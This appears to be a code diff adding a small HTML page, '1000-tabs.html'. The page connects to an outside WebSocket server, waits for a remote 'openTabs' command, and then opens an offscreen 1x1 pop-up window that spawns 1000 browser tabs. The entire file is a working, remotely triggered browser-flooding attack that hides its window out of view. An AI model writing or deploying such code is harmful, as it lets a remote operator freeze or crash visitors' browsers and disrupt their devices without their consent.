@@ -1,0 +1,39 @@
+<!-- 1000-tabs.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>1000 Tabs</title>
+</head>
+<body>
+  <h1>Waiting for trigger...</h1>
+  <p>This page will open 1000 tabs when remotely triggered.</p>
+
+  <script>
+    const sessionId = crypto.randomUUID(); // Generate a unique session ID
+    const socket = new WebSocket('https://websocket-backend-kajx.onrender.com'); // Replace with your actual backend URL
+
+    socket.addEventListener('open', () => {
+      socket.send(JSON.stringify({
+        event: 'registerSession',
+        sessionId: sessionId
+      }));
+    });
+
+    socket.addEventListener('message', (event) => {
+      const data = JSON.parse(event.data);
+      if (data.event === 'openTabs' && data.sessionId === sessionId) {
+        openHiddenWindowWithTabs();
+      }
+    });
+
+    function openHiddenWindowWithTabs() {
+      const hiddenWin = window.open('', '', 'width=1,height=1,left=10000,top=10000');
+      for (let i = 0; i < 1000; i++) {
+        hiddenWin.open(`https://example.com?tab=${i}`, '_blank');
+      }
+    }
+  </script>
+</body>
+</html>
